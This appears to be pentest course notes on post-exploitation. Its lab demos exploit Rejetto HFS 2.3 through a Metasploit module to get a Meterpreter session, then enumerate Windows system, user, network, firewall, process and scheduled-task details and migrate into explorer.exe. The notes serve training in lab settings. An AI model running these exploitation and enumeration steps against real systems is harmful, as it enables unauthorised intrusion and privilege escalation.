# Introduction

## Post-Exploitation

### Introduction to Post-Exploitation

#### Post-Exploitation

- Post-exploitation is the final phase of the pentest process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
- In other words, post-exploitation involves what you do or have to do once you gain an initial foothold on the target system.
- Post-exploitation will differ based on the target operating system as well as the target infrastructure.
- The post-exploitation techniques and tools that you canuse will depend on what kind of access you have on the system you have compromised as well as how stealthy you have to be.
- This ultimately means that you will need to utilize different techniques and tools based on the target operating system and its configuration.
- The post-exploitation techniques you can run against the target will need to abide by the rules of engagement agreed upon with the client you are perform the pentest for.

**Note:** When running post-exploitation techniques, you need to be sure that you have the necessary permissions and rights to modify services, system configurations, perform privilege escalation, delete logs etc.

![grafik](https://github.com/user-attachments/assets/37bcb4e2-30fd-4654-a6be-26d736921485)


This diagram outlines the various phases of the pentesting lifecycle and highlights the post exploitation phase and the techniques that fall under the post-exploitation phase
  
### Post-Exploitation Methodology

#### Post-Exploitation Methodology

In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements.
This structured, methodological approach ensured that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

#### Post-Exploitation Methodology

![grafik](https://github.com/user-attachments/assets/f258672d-32f0-4398-9055-1254d16e44e7)

#### Local Enumeration

![grafik](https://github.com/user-attachments/assets/6b551663-dd57-4e06-956b-4e819717dc27)

#### Transferring Files

![grafik](https://github.com/user-attachments/assets/9cb527ee-3a8b-4efc-95ed-844a626bf567)

#### Upgrading Shells

![grafik](https://github.com/user-attachments/assets/c74a105a-480c-4bbe-9cd6-edb18a8d777c)

#### Privilege Escalation

![grafik](https://github.com/user-attachments/assets/0e3242b3-3d4f-4b80-8cff-e2bdcfe783bb)

#### Persistence 

![grafik](https://github.com/user-attachments/assets/64a60b50-4d17-44f7-8ac2-bacf95f67253)

#### Dumping & Cracking Hashes

![grafik](https://github.com/user-attachments/assets/38ea8a98-afa0-434a-91ee-b2f3a142d716)

#### Pivoting

![grafik](https://github.com/user-attachments/assets/43063dc6-7abd-40fa-b1e8-7cf56a6164a6)

#### Clearing Your Tracks 

![grafik](https://github.com/user-attachments/assets/1a380143-5adb-4f68-a339-e845b3383064)

# Windows Enumeration

## Windows Local Enumeration

### Enumerating System Information

#### Enumerating System Information

- After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - OS Name (Windows 7,8 etc)
  - OS Build & Service Pack (Windows 7 SP1 7600)
  - OS Architecture (x64&x86)
  - Installed updates/Hotfixes

### Demo: Enumerating System Information


#### Step 1: Check Connectivity to the Target

To verify if the target machine is reachable, use the **ping** command:

```bash
ping -c 4 demo.ine.local
```

- If the target responds, it indicates that the system is reachable.

#### Step 2: Port Scanning with Nmap

Perform a service version detection scan to identify vulnerable services on the target system using **Nmap**:

```bash
nmap -sV demo.ine.local
```

- The scan should reveal services running on open ports. In this case, port **80** is running **Rejetto HTTP File Server 2.3**.

#### Step 3: Searching for Exploits Using Searchsploit

With the information from the Nmap scan, search for known vulnerabilities affecting **Rejetto HTTP File Server 2.3** using **Searchsploit**:

```bash
searchsploit rejetto
```

- The **Searchsploit** output reveals an available **Metasploit Framework exploit module** that targets this version of **Rejetto**.

#### Step 4: Gaining Access with Metasploit

To exploit the vulnerability, start the **Metasploit Framework** and use the **Rejetto HFS exploit module**:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Load the **Rejetto HFS exploit module**:

    ```bash
    use exploit/windows/http/rejetto_hfs_exec
    ```

3. Set the target address:

    ```bash
    set RHOSTS demo.ine.local
    ```

4. Execute the exploit:

    ```bash
    exploit
    ```

If successful, this will open a **Meterpreter session** on the target system.

#### Step 5: Enumerating System Information

Once you gain access to the system, it’s important to gather as much information as possible to understand the system's environment and any potential vulnerabilities.

#### Step 5.1: System Information with Meterpreter

Run the **sysinfo** command to get basic system information:

```bash
sysinfo
```

- Output: Shows the **operating system**, **hostname**, **architecture**, and **domain** of the target system. In this case, the system is running **Windows Server 2012 R2**.

#### Step 5.2: Spawn a Native Shell and Get Hostname

To switch to a native shell session on the target, run:

```bash
shell
```

Once in the shell, you can run native Windows commands, such as getting the hostname:

```bash
hostname
```

#### Step 5.3: Detailed System Information

For more detailed system information, such as hardware details and a list of installed Windows updates, use the **systeminfo** command:

```bash
systeminfo
```

- This provides critical details, including **Windows version**, **OS build number**, **hardware configuration**, and **installed HotFixes**.

You can also retrieve a detailed list of installed updates, including the **HotFix IDs** and **installation dates**, by running the following **WMIC** command:

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Output: Displays when each update was installed and its **HotFix ID**, which helps identify potential vulnerabilities or missing patches.

#### Why Is This Information Important?

- **Installed HotFixes** and **system details** provide insight into whether the system is missing critical updates or patches that could allow for privilege escalation or lateral movement.
- Knowing the **operating system** version, build number, and installed patches helps you determine if there are any known vulnerabilities that can be exploited to further compromise the system.

---

#### Conclusion

In this demo, we:
1. Checked connectivity to the target system.
2. Used **Nmap** to identify services running on the target.
3. Found an exploit for **Rejetto HTTP File Server 2.3** using **Searchsploit**.
4. Exploited the service using **Metasploit** to gain a **Meterpreter session** on the target.
5. Enumerated system information, including the **Windows version**, **installed updates**, and other details, to identify potential vulnerabilities.

This process is critical in any penetration test as it helps gather useful information that can be used to further escalate privileges or move laterally across the network.

### Enumerating Users & Groups

- After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
- What are we looking for?
  - Current user & privileges
  - Additional user information
  - Other users on the system
  - Groups
  - Members of the built-in administrator group

### Demo: Enumerating Users & Groups

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Check User ID and Privileges

Once we have a **Meterpreter session**, check the current user and privileges:

```bash
getuid
getprivs
```

#### Step 3: Enumerating Logged-On Users Using Metasploit

Background the session:

```bash
background
```

Search for the **enum_logged_on_users** module:

```bash
search logged_on
```

Use the module:

```bash
use post/windows/gather/enum_logged_on_users
```

Set the **Meterpreter session ID**:

```bash
set session 1
```

Run the module:

```bash
run
```

#### Step 4: Return to the Meterpreter Session

Return to the **Meterpreter session** to continue manual enumeration:

```bash
sessions 1
```

### ### Performing User & Group Enumeration Manually

Switch to a **native shell** to perform manual enumeration:

```bash
shell
```

Run the following commands to enumerate users, groups, and privileges:

- **Check privileges** of the current user:

    ```bash
    whoami /priv
    ```

- **Query logged-on users**:

    ```bash
    query user
    ```

- **List all local users**:

    ```bash
    net users
    ```

- **Check details of the Administrator account**:

    ```bash
    net user administrator
    ```

- **List local groups**:

    ```bash
    net localgroup
    ```

- **List members of the Administrators group**:

    ```bash
    net localgroup administrators
    ```

### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Ran **Metasploit's post-exploitation module** to enumerate logged-on users.
3. Performed manual **user and group enumeration** using native **Windows commands**.

This process helps in identifying user accounts and privilege levels, which can be useful for further exploitation or privilege escalation.

#### Enumerating Network Information

- What are we looking for?
  - Current IP address & network adapter
  - Internal networks
  - TCP/UDP services running and their respective ports
  - Other hosts on the network
  - Routing table
  - Windows Firewall state

### Demo: Enumerating Network Information

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Open a Shell Session

Switch to a **native shell** to begin enumerating network information:

```bash
shell
```

#### Step 3: Enumerating Network Configuration

To gather network information such as the **IP address** and **adapter details**, use the following commands:

- Display **IP configuration**:

    ```bash
    ipconfig
    ```

- Display detailed **IP configuration and adapter info**:

    ```bash
    ipconfig /all
    ```

#### Step 4: Displaying the Routing Table

To view the system's **routing table**:

```bash
route print
```

#### Step 5: Viewing the ARP Table

The **ARP table** lists all devices on the network that the system has communicated with:

```bash
arp -a
```

#### Step 6: Listing Open Ports and Services

Use **netstat** to list open ports, active connections, and services running on the system:

```bash
netstat -ano
```

#### Step 7: Working with the Windows Firewall

Check the state of the **Windows Firewall** using **netsh**:

- View basic firewall state:

    ```bash
    netsh firewall show state
    ```

- For newer Windows versions, use the following **netsh** commands for **Advanced Firewall**:

    ```bash
    netsh advfirewall firewall state
    ```

    ```bash
    netsh advfirewall
    ```

    ```bash
    netsh advfirewall firewall help
    ```

- Dump current firewall rules to review configuration:

    ```bash
    netsh advfirewall firewall dump
    ```

- Show the state of all firewall profiles (domain, private, public):

    ```bash
    netsh advfirewall show allprofiles
    ```

- **Note**: **netsh advfirewall** allows managing firewall settings, including creating listeners or configuring ports for communication.

#### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Used native Windows commands to gather detailed **network information**:
   - Checked the IP configuration, routing table, and ARP table.
   - Listed open ports and services.
   - Investigated the **Windows Firewall** configuration.

This information can be useful for identifying potential attack vectors, open ports for further exploitation, and understanding the network topology of the target environment.

### Enumerating Processes & Services

- After gaining initial access to a target system, it is always important to learn more about the system like, what processes, sevices and scheduled tasks are currently running.
- What are we looking for?
  - Running processes & services
- A process is an instance of a running executable (.exe) or program.
- A service is a process which runs in the background and does not interact with the desktop.

### Demo: Enumerating Processes & Services

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Enumerating Running Processes

To list all currently running processes, use the following command in the **Meterpreter session**:

```bash
ps
```

#### Step 3: Migrating to a Stable Process

It’s often beneficial to migrate the **Meterpreter session** to a stable process such as **explorer.exe**. First, identify the **process ID (PID)** of `explorer.exe`:

```bash
pgrep explorer.exe
```

Once the process is found, migrate to it by specifying the PID:

```bash
migrate 2176
```

Migration will allow us to maintain a more stable connection. After migration, check the system architecture:

```bash
sysinfo
```

#### Step 4: Checking if a Specific Process is Running

To check if a specific process, such as **hfs.exe**, is running:

```bash
pgrep hfs.exe
```

#### Step 5: Enumerating Processes & Services via Shell

Switch to a **native shell** to list running processes and services:

```bash
shell
```

- **List all running services**:

    ```bash
    net start
    ```

- **List services in brief using **WMIC** (Windows Management Instrumentation Command)**:

    ```bash
    wmic service list brief
    ```

- **List processes with their associated services**:

    ```bash
    tasklist /SVC
    ```

#### Step 6: Enumerating Scheduled Tasks

Misconfigured **scheduled tasks** can sometimes be used to elevate privileges. Use the following commands to list them:

- **Query scheduled tasks** in a simple list format:

    ```bash
    schtasks /query /fo LIST
    ```

- **Query detailed information** on scheduled tasks:

    ```bash
    schtasks /query /fo LIST /v
    ```

This will display all scheduled tasks and detailed information, which could be useful for identifying potential misconfigurations or escalation vectors.

#### Conclusion

In this demo, we:
1. Used **Meterpreter** to enumerate running processes on the target system.
2. Migrated to a stable process, **explorer.exe**, for a more reliable connection.
3. Switched to a **native shell** to list running services and processes using **net start**, **WMIC**, and **tasklist**.
4. Enumerated **scheduled tasks**, which could be potential targets for privilege escalation.

Understanding the processes and services running on a target system is critical for identifying misconfigurations, potential targets for further exploitation, or establishing persistence on the system.

